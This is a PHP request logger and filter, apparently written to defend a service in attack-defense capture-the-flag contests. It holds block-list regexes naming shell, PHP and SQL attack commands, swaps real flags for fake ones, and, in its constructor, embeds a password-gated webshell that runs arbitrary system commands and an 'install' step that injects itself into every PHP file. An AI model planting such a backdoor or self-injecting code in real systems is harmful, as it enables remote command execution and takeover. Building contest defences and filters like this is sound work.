<?php
/* ServerLog by XMU-Seas0nic */

date_default_timezone_set('Asia/Shanghai');

$logger = new Logger();
$logger->log();


class Logger
{
  private $log;
  private $log_all;
  // webshell password
  private $ip = '/127.0.0.1/';
  private $password = 'a7301d0faa408c5f8fde7fd276c369217f86ca56';
  // log files
  private $filename = '109';
  private $dirname = 'up10ad';
  // flag replacement
  private $fake_flag = 'flag{d7647e2f-806e-45d8-9037-f5c77873505f}';
  private $real_flag = '/flag{(\w|-)+}/i';
  // filter regex
  private $get_flag = '/(cat|tac|nl|head|tail|more|less)( |\$IFS|\$\d+)+.*\/(f|\?)(l|\?)(a|\?)(g|\?)/';
  private $php_cmd = '/(eval|include(_once)?|require(_once)?|assert|exec|system|call_user_func(_array)?|popen|passthru|preg_(match|replace)|serialize|file_(get|put)_contents) *\(/';
  private $shell_cmd = '/(ba)?sh( |\$IFS|\$\d+)+-c( |\$IFS|\$\d+)+|rm( |\$IFS|\$\d+)+-(r|rf|fr)( |\$IFS|\$\d+)+|kill( |\$IFS|\$\d+)+-(s|SIG\w{2,3}|\d{1,2})( |\$IFS|\$\d+)+|base64( |\$IFS|\$\d+)+-d( |\$IFS|\$\d+)+|LD_PRELOAD/';
  private $sql_cmd = '/(select|delete).+from|update.+set|drop.+(database|table|view)|union.+select|information_schema|(and|or).+1 *= *1/i';
  private $user_agent = '/python|curl|sqlmap|burpsuite|postman|paw/i';
  // sleep time to delay stupid attackers
  private $time = 60;

  public function __construct()
  {
    // own webshell
    if (isset($_GET['pass']) && isset($_GET['cmd']))
      if (preg_match($this->ip, $_SERVER['REMOTE_ADDR']) === 1 && sha1($_GET['pass']) === $this->password) {
        if ($_GET['cmd'] === 'install')
          system("tar -cvf www.tar . && find . -name \"*.php\" -a -not -name \"logger.php\" | xargs gsed -i \"1i <?php include_once 'logger.php'; ?>\n\"");
        else if ($_GET['cmd'] === 'monitor')
          system("find . -mtime -30m | xargs ls -ald | awk '{print $8 \" @ \" $9}' | sort -r");
        else if ($_GET['cmd'] === 'log')
          system("tail -n 300 log");
        else
          system($_GET['cmd']);
        exit();
      }
    ob_start(array($this, 'check_res'));
    if (!file_exists($this->dirname))
      mkdir($this->dirname);
  }

  public function log()
  {
    $timestamp = date('H:i:s');
    $basic = "[$timestamp] [$_SERVER[REMOTE_ADDR]] @ $_SERVER[SCRIPT_NAME]";
    $endpoint = $_SERVER['REQUEST_METHOD'] . ' ' . urldecode($_SERVER['REQUEST_URI']);
    $headers = '';
    foreach (getallheaders() as $k => $v)
      $headers .= "  $k: $v\n";
    $body = urldecode(file_get_contents("php://input"));

    if (strlen($body) === 0) {
      $this->log = "$basic\n$endpoint\n";
      $this->log_all = "$basic\n  $endpoint\n$headers";
    } else {
      $this->log = "$basic\n$endpoint\n$body\n";
      $this->log_all = "$basic\n  $endpoint\n${headers}[body]\n  $body\n";
    }
    $this->log_arr('get', $_GET);
    $this->log_arr('post', $_POST);
    $this->log_arr('cookies', $_COOKIE);

    if (count($_FILES) !== 0) {
      $this->log_all .= "[files]\n";
      foreach ($_FILES as $k => $v) {
        $this->log_all .= "  name: $k, filename: $v[name], content-type: $v[type]\n";
        $filename = "$this->dirname/[$timestamp][$_SERVER[REMOTE_ADDR]]$v[name].orz";
        copy($v['tmp_name'], $filename);
      }
    }
    $this->log_all .= "\n----------------------------------------\n";

    file_put_contents($this->filename, "$this->log\n", FILE_APPEND);
    file_put_contents("$this->filename.all", "$this->log_all\n", FILE_APPEND);
    $this->check_req();
  }

  private function log_arr($name, $arr)
  {
    if (count($arr) !== 0) {
      $this->log_all .= "[$name]\n";
      foreach ($arr as $k => $v)
        $this->log_all .= "  $k = $v\n";
    }
  }

  private function check_req()
  {
    if (isset($this->user_agent) && preg_match_all($this->user_agent, $_SERVER['HTTP_USER_AGENT']) !== 0)
      $this->die_lapse();
    if (isset($this->get_flag) && preg_match_all($this->get_flag, $this->log_all) !== 0)
      $this->die_lapse();
    if (isset($this->php_cmd) && preg_match_all($this->php_cmd, $this->log_all) !== 0)
      $this->die_lapse();
    if (isset($this->shell_cmd) && preg_match_all($this->shell_cmd, $this->log_all) !== 0)
      $this->die_lapse();
    if (isset($this->sql_cmd) && preg_match_all($this->sql_cmd, $this->log_all) !== 0)
      $this->die_lapse();
  }

  public function check_res($buffer, $phase)
  {
    if (isset($this->fake_flag) && isset($this->real_flag))
      if (strstr($buffer, $this->fake_flag) === false && preg_match_all($this->real_flag, $buffer) !== 0) {
        chdir($_SERVER['DOCUMENT_ROOT']);
        file_put_contents("$this->filename.attack", "$this->log\n", FILE_APPEND);
        file_put_contents("$this->filename.attack.all", "$this->log_all\n", FILE_APPEND);
        sleep($this->time);
        return preg_replace($this->real_flag, $this->fake_flag, $buffer);
      }
    return false;
  }

  private function die_lapse()
  {
    file_put_contents("$this->filename.filtered", "$this->log\n", FILE_APPEND);
    file_put_contents("$this->filename.filtered.all", "$this->log_all\n", FILE_APPEND);
    sleep($this->time);
    die($this->fake_flag);
  }
}
